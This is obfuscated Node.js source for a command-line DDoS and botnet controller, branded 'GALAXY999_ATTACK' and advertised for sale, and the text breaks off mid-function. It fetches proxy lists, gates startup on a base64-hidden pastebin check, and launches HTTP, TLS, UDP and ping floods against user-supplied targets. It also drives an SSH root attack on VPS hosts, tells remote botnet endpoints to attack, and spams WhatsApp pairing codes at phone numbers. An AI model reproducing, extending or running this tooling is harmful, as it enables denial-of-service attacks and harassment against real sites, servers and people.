#!/usr/bin/env node
const {
  exec,
  spawn
} = require("child_process");
const readline = require("readline");
const url = require("url");
const fs = require('fs');
const axios = require("axios");
const path = require("path");
const TelegramBot = require('node-telegram-bot-api');
let processList = [];
const permen = readline.createInterface({
  'input': process.stdin,
  'output': process.stdout
});
function sleep(_0xaf8583) {
  return new Promise(_0x3c6706 => setTimeout(_0x3c6706, _0xaf8583));
}
async function banner() {
  console.clear();
  console.log(
` ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
. ⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
 ⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
 ⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
  ⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿
    
    𝐆𝐀𝐋𝐀𝐗𝐘𝟗𝟗𝟗_𝐀𝐓𝐓𝐀𝐂𝐊
Credit Script By galaxy999
𝐁𝐔𝐘 𝐒𝐂 : 6281234184136`);
}
async function scrapeProxy() {
  try {
    const _0x10c017 = await fetch("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt");
    const _0x36b05b = await _0x10c017.text();
    fs.writeFileSync('proxy.txt', _0x36b05b, 'utf-8');
  } catch (_0x38dcec) {
    console.error("Error fetching data: " + _0x38dcec.message);
  }
}
async function scrapeUserAgent() {
  try {
    const _0x2d4e24 = await fetch("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt");
    const _0x5c4f41 = await _0x2d4e24.text();
    fs.writeFileSync("ua.txt", _0x5c4f41, "utf-8");
  } catch (_0x58584a) {
    console.error("Error fetching data: " + _0x58584a.message);
  }
}
function clearProxy() {
  if (fs.existsSync("proxy.txt")) {
    fs.unlinkSync("proxy.txt");
  }
}
function clearUserAgent() {
  if (fs.existsSync("ua.txt")) {
    fs.unlinkSync("ua.txt");
  }
}
async function bootup() {
  try {
    console.log("|| ▓░░░░░░░░░ || 10%");
    await exec("npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent");
    console.log("|| ▓▓░░░░░░░░ || 20%");
    const _0x4201b2 = Buffer.from('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0R2VWZtazBS', "base64").toString("utf8");
    const _0xde50f = await fetch(_0x4201b2);
    const _0x432a49 = await _0xde50f.text();
    console.log("|| ▓▓▓░░░░░░░ || 30%");
    if ("requeire(cheros)" === _0x432a49.trim()) {
      console.log("|| ▓▓▓▓▓▓░░░░ || 60%");
      await scrapeProxy();
      console.log("|| ▓▓▓▓▓▓▓░░░ || 70%");
      await scrapeUserAgent();
      console.log("|| ▓▓▓▓▓▓▓▓▓▓ || 100%");
      await sleep(0x2bc);
      console.clear();
      console.log("Welcome To RenMD 6.0.0");
      await sleep(0x3e8);
      await banner();
      console.log("Type \"help\" For Showing All Available Commands");
      sigma();
    } else {
      console.log("Error => " + _0x432a49.trim());
      await exec("npm uninstall -g prmnmd-tuls");
      await exec("npm i -g prmnmd-tuls");
      console.log("Restart Tools Please");
      process.exit();
    }
  } catch (_0x478813) {
    console.log("Are You Online?");
  }
}
async function pushOngoing(_0x337f21, _0x453cae, _0x4344e8) {
  const _0x498bad = Date.now();
  processList.push({
    'target': _0x337f21,
    'methods': _0x453cae,
    'startTime': _0x498bad,
    'duration': _0x4344e8
  });
  setTimeout(() => {
    const _0x23e15a = processList.findIndex(_0x4eb549 => _0x4eb549.methods === _0x453cae);
    if (_0x23e15a !== -0x1) {
      processList.splice(_0x23e15a, 0x1);
    }
  }, _0x4344e8 * 0x3e8);
}
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach(_0x5a3ba0 => {
    console.log("Target: " + _0x5a3ba0.target + "\nMethods: " + _0x5a3ba0.methods + "\nDuration: " + _0x5a3ba0.duration + " Seconds\nSince: " + Math.floor((Date.now() - _0x5a3ba0.startTime) / 0x3e8) + " seconds ago\n");
  });
}
async function handleAttackCommand(_0x387acc) {
  if (_0x387acc.length < 0x3) {
    console.log("Example: tls <target>  <port> <duration>\ntls https://google.com 433 120");
    sigma();
    return;
  }
  const [_0x2758e9, _0x17933b, _0x56ee7b] = _0x387acc;
  try {
    const _0x20069d = new url.URL(_0x2758e9);
    const _0x3943f7 = _0x20069d.hostname;
    const _0x33b56e = await axios.get('http://ip-api.com/json/' + _0x3943f7 + "?fields=isp,query,as");
    const _0x1478c1 = _0x33b56e.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n                      Attack Has Been Launched\n========================================================================\nStatus   : [38;5;160mAttack Has Successfull Launched[0m\nTarget   : " + _0x2758e9 + "\nDuration : " + _0x56ee7b + "\nMethods  : " + methods + "\nISP      : " + _0x1478c1.isp + "\nIp       : " + _0x1478c1.query + "\nAS       : " + _0x1478c1.as + "\n");
  } catch (_0x4776a2) {
    console.log("Oops Something Went wrong");
  }
  const _0x355fd3 = path.join(__dirname, "/lib/cache/" + methods);
  if (methods === 'flood') {
    pushOngoing(_0x2758e9, methods, _0x56ee7b);
    exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 64 10 proxy.txt");
    sigma();
  } else {
    if (methods === 'httpx') {
      pushOngoing(_0x2758e9, methods, _0x56ee7b);
      exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 9 3 proxy.txt");
      sigma();
    } else {
      if (methods === "tls") {
        pushOngoing(_0x2758e9, methods, _0x56ee7b);
        exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 100 10");
        sigma();
      } else {
        if (methods === "bypass") {
          pushOngoing(_0x2758e9, methods, _0x56ee7b);
          exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 32 8 proxy.txt");
          sigma();
        } else {
          if (methods === "bomb") {
            pushOngoing(_0x2758e9, methods, _0x56ee7b);
            exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 32 8 proxy.txt");
            sigma();
          } else {
            if (methods === "black") {
              pushOngoing(_0x2758e9, methods, _0x56ee7b);
              exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 32 8 proxy.txt");
              sigma();
            } else {
              if (methods === "crot") {
                pushOngoing(_0x2758e9, methods, _0x56ee7b);
                exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 64 10 proxy.txt");
                sigma();
              } else {
                if (methods === "raw") {
                  pushOngoing(_0x2758e9, methods, _0x56ee7b);
                  exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b);
                  sigma();
                } else {
                  if (methods === "pluto") {
                    pushOngoing(_0x2758e9, methods, _0x56ee7b);
                    exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 100 10 proxy.txt");
                    sigma();
                  } else {
                    if (methods === "storm") {
                      pushOngoing(_0x2758e9, methods, _0x56ee7b);
                      exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 100 10 proxy.txt");
                      sigma();
                    } else {
                      if (methods === 'harder') {
                        pushOngoing(_0x2758e9, methods, _0x56ee7b);
                        exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 32 10 proxy.txt");
                        sigma();
                      } else {
                        if (methods === "hitam") {
                          pushOngoing(_0x2758e9, methods, _0x56ee7b);
                          exec("node " + _0x355fd3 + " GET " + _0x2758e9 + " " + _0x56ee7b + " 10 90 proxy.txt --full");
                          sigma();
                        } else {
                          if (methods === "tlsv2") {
                            pushOngoing(_0x2758e9, methods, _0x56ee7b);
                            exec("node " + _0x355fd3 + " " + _0x2758e9 + " " + _0x56ee7b + " 64 10 proxy.txt");
                            sigma();
                          } else {
                            if (methods === "mixed") {
                              pushOngoing(_0x2758e9, methods, _0x56ee7b);
                              const _0x358a70 = path.join(__dirname, '/lib/cache/glory');
                              const _0x486da7 = path.join(__dirname, "/lib/cache/storm");
                              const _0xb959b3 = path.join(__dirname, "/lib/cache/harder");
                              exec("node " + _0x358a70 + " " + _0x2758e9 + " " + _0x56ee7b + " 32 8 proxy.txt");
                              exec("node " + _0x486da7 + " " + _0x2758e9 + " " + _0x56ee7b + " 100 10 proxy.txt");
                              exec("node " + _0xb959b3 + " " + _0x2758e9 + " " + _0x56ee7b + " 32 8 proxy.txt");
                              sigma();
                            } else {
                              console.log("Method " + methods + " not recognized.");
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
;
function methods() {
  const _0xade6eb = JSON.parse(fs.readFileSync('lib/methods.json', "utf-8"));
  console.log("                          Methods");
  console.log(" NAME      │ DESCRIPTION                    │ DURATION");
  console.log('───────────┼────────────────────────────────┼──────────');
  _0xade6eb.forEach(_0x522eb4 => {
    console.log(_0x522eb4.name.padEnd(0xa) + " │ " + _0x522eb4.description.padEnd(0x1e) + " │ " + _0x522eb4.duration.padEnd(0x3));
  });
}
async function Botnethitam(_0x3f42b4) {
  if (_0x3f42b4.length < 0x3) {
    console.log("Example: botnet <target> <duration> <methods>\nbotnet https://google.com 120 flood");
    sigma();
    return;
  }
  const [_0x23915e, _0x2c7ab3, _0x4fed96] = _0x3f42b4;
  try {
    const _0x5a2096 = new url.URL(_0x23915e);
    const _0x1a5987 = _0x5a2096.hostname;
    const _0x237097 = await axios.get('http://ip-api.com/json/' + _0x1a5987 + "?fields=isp,query,as");
    const _0x4b3468 = _0x237097.data;
    let _0x294791;
    let _0x199fa0 = 0x0;
    const _0x45eb53 = [];
    try {
      _0x294791 = JSON.parse(fs.readFileSync("./lib/botnet.json", "utf8"));
    } catch (_0x3c7c0c) {
      console.error("Error loading botnet data:", _0x3c7c0c.message);
      _0x294791 = {
        'endpoints': []
      };
    }
    const _0xd7deb = _0x294791.endpoints.map(async _0x2220b9 => {
      const _0x4ce374 = _0x2220b9 + "?target=" + _0x23915e + "&time=" + _0x2c7ab3 + "&methods=" + _0x4fed96;
      try {
        const _0x348173 = await axios.get(_0x4ce374, {
          'timeout': 0x4e20
        });
        if (_0x348173.status === 0xc8) {
          _0x199fa0++;
          _0x45eb53.push(_0x2220b9);
        }
      } catch (_0x26fafb) {
        console.error("Error sending request to " + _0x2220b9 + ": " + _0x26fafb.message);
      }
    });
    await Promise.all(_0xd7deb);
    _0x294791.endpoints = _0x45eb53;
    try {
      fs.writeFileSync("./lib/botnet.json", JSON.stringify(_0x294791, null, 0x2));
    } catch (_0x35886b) {
      console.error("Error saving botnet data:", _0x35886b.message);
      sigma();
    }
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n                      Attack Has Been Launched\n========================================================================Target Detail\n - Target   : [ " + _0x23915e + " ]\n - Isp      : [ " + _0x4b3468.isp + " ]\n - Ip       : [ " + _0x4b3468.query + " ]\n - As      : [ " + _0x4b3468.as + " ]\nAttack Detail\n - Status   : [ Attack Succses ]\n - Botnet  : [ " + _0x199fa0 + " ]\n - Duration : [ " + _0x2c7ab3 + " ]\n - Methods  : [ " + _0x4fed96 + " ]\n");
    sigma();
  } catch (_0x2c8414) {
    console.error("Terjadi kesalahan:", _0x2c8414.message);
  }
}
async function processBotnetEndpoint(_0x9c34d8) {
  if (_0x9c34d8.length < 0x1) {
    console.log("Example: add-botnet <endpoints>\nadd-botnet http://1.1.1.1:2000/permen");
    sigma();
    return;
  }
  try {
    const _0x11605c = new url.URL(_0x9c34d8);
    const _0x30c97b = _0x11605c.host;
    const _0x16b681 = "http://" + _0x30c97b + "/permen";
    let _0x4efd4b;
    try {
      const _0x3a8cf1 = await fs.promises.readFile("./lib/botnet.json", "utf8");
      _0x4efd4b = JSON.parse(_0x3a8cf1);
    } catch (_0x589dbf) {
      console.error("Error loading botnet data:", _0x589dbf.message);
      _0x4efd4b = {
        'endpoints': []
      };
    }
    if (_0x4efd4b.endpoints.includes(_0x16b681)) {
      return console.log("Endpoint " + _0x16b681 + " is already in the botnet list.");
    }
    _0x4efd4b.endpoints.push(_0x16b681);
    try {
      await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(_0x4efd4b, null, 0x2));
    } catch (_0x36d2c7) {
      console.error("Error saving botnet data:", _0x36d2c7.message);
      return console.log("Error saving botnet data.");
    }
    console.log("Endpoint " + _0x16b681 + " added to botnet.");
    sigma();
  } catch (_0x62bbf3) {
    console.error("Error processing botnet endpoint:", _0x62bbf3.message);
    console.log("An error occurred while processing the endpoint.");
    sigma();
  }
}
async function checkBotnetEndpoints() {
  let _0x3ada84;
  let _0x4f2599 = 0x0;
  const _0x5188d4 = [];
  try {
    _0x3ada84 = JSON.parse(fs.readFileSync("./lib/botnet.json", 'utf8'));
  } catch (_0x4db8ac) {
    console.error("Error loading botnet data:", _0x4db8ac.message);
    _0x3ada84 = {
      'endpoints': []
    };
  }
  const _0x1940e1 = _0x3ada84.endpoints.map(async _0x127447 => {
    const _0x2700e0 = _0x127447 + "?target=test&time=1&methods=ninja";
    try {
      const _0x41a904 = await axios.get(_0x2700e0, {
        'timeout': 0x4e20
      });
      if (_0x41a904.status === 0xc8) {
        _0x4f2599++;
        _0x5188d4.push(_0x127447);
      }
    } catch (_0x381526) {
      console.error("Error sending request to " + _0x127447 + ": " + _0x381526.message);
    }
  });
  await Promise.all(_0x1940e1);
  _0x3ada84.endpoints = _0x5188d4;
  try {
    fs.writeFileSync('./lib/botnet.json', JSON.stringify(_0x3ada84, null, 0x2));
  } catch (_0x595300) {
    console.error("Error saving botnet data:", _0x595300.message);
    sigma();
  }
  console.log("Checked endpoints. " + _0x4f2599 + " botnet endpoint(s) are online.");
  sigma();
}
async function SpamPair(_0x4d0ed4) {
  if (_0x4d0ed4.length < 0x2) {
    console.log("Example: pairing <target> <duration> \npairing 6281111111111 500");
    sigma();
    return;
  }
  const [_0x30c28d, _0x503181] = _0x4d0ed4;
  try {
    console.log("Attack Detail\n - Target   : [ " + _0x30c28d + " ]\n - Duration : [ " + _0x503181 + " ]\n - Methods  : [ Spam Pairing Code ]\n");
  } catch (_0x5e25e5) {
    console.log("Error");
  }
  const _0xdd6a6f = path.join(__dirname, "/lib/cache/17");
  exec("node " + _0xdd6a6f + " " + _0x30c28d + " " + _0x503181);
  sigma();
}
;
async function pod(_0x105f29) {
  if (_0x105f29.length < 0x2) {
    console.log("Example: kill-ping <target> <duration>\nkill-ping 123.456.789.10 120");
    sigma();
    return;
  }
  const [_0x15c22d, _0x5d0aef] = _0x105f29;
  try {
    const _0x5cc564 = await axios.get('http://ip-api.com/json/' + _0x15c22d + "?fields=isp,query,as");
    const _0x5c99b2 = _0x5cc564.data;
    console.log("Target Detail\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x15c22d + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x5d0aef + " [1;37m]\n[1;37m      Methods:    [[1m[36m kill-ping [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x5c99b2.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x5c99b2.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x5c99b2.query + " [1;37m]\n");
  } catch (_0x3c0f0c) {
    console.log("Oops Something Went Wrong");
  }
  const _0x311853 = path.join(__dirname, "/lib/cache/18");
  exec("node " + _0x311853 + " " + _0x15c22d + " 66507 6 1 " + _0x5d0aef);
  sigma();
}
;
async function killDo(_0x30f5c8) {
  if (_0x30f5c8.length < 0x2) {
    console.log("Example: kill-do <target> <duration>\nkill-do 123.456.78.910 300");
    sigma();
    return;
  }
  const [_0x2a3282, _0x5d1c77, _0x5bd27b] = _0x30f5c8;
  try {
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n                    VPS Killer Has Been Launched\n========================================================================\nTarget   : " + _0x2a3282 + "\nDuration : " + _0x5bd27b + "\nMethods  : Digital Ocean Killer\nCreator  : V3 And Joseph");
  } catch (_0x570fe8) {
    console.log("Oops Something Went Wrong");
  }
  const _0x1a3d07 = path.join(__dirname, "/lib/cache/14");
  const _0x5bb893 = path.join(__dirname, "/lib/cache/3");
  const _0x11fc1d = path.join(__dirname, "/lib/cache/19");
  exec("node " + _0x11fc1d + " " + _0x2a3282 + " 22 root " + _0x5bd27b);
  exec("node " + _0x5bb893 + " http://" + _0x2a3282 + " " + _0x5bd27b);
  exec("node " + _0x1a3d07 + " http://" + _0x2a3282 + " " + _0x5bd27b);
  sigma();
}
;
async function udp_flood(_0x12f911) {
  if (_0x12f911.length < 0x3) {
    console.log("Example: udp-raw <target> <port> <duration>\nudp-raw 123.456.78.910 53 300");
    sigma();
    return;
  }
  const [_0x225642, _0x432472, _0x1a9886] = _0x12f911;
  try {
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n                    UDP Raw Flood Attack Launched\n========================================================================\nTarget   : " + _0x225642 + "\nDuration : " + _0x1a9886 + "\nMethods  : UDP Raw\nCreator  : V3 And Joseph");
  } catch (_0x24a576) {
    console.log("Oops Something Went Wrong");
  }
  const _0x10412b = path.join(__dirname, "/lib/cache/20");
  exec("node " + _0x10412b + " " + _0x225642 + " " + _0x432472 + " " + _0x1a9886);
  sigma();
}
;
async function flood(_0x2d4a19) {
  if (_0x2d4a19.length < 0x3) {
    console.log("Example: .flood <target> <port> <duration>\nflood https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x5a311c, _0x44301e, _0x6aae] = _0x2d4a19;
  try {
    const _0x10f0a6 = new url.URL(_0x5a311c);
    const _0x5c2ce8 = _0x10f0a6.hostname;
    const _0x395b44 = await axios.get("http://ip-api.com/json/" + _0x5c2ce8 + "?fields=isp,query,as");
    const _0x471d4a = _0x395b44.data;
    console.clear();
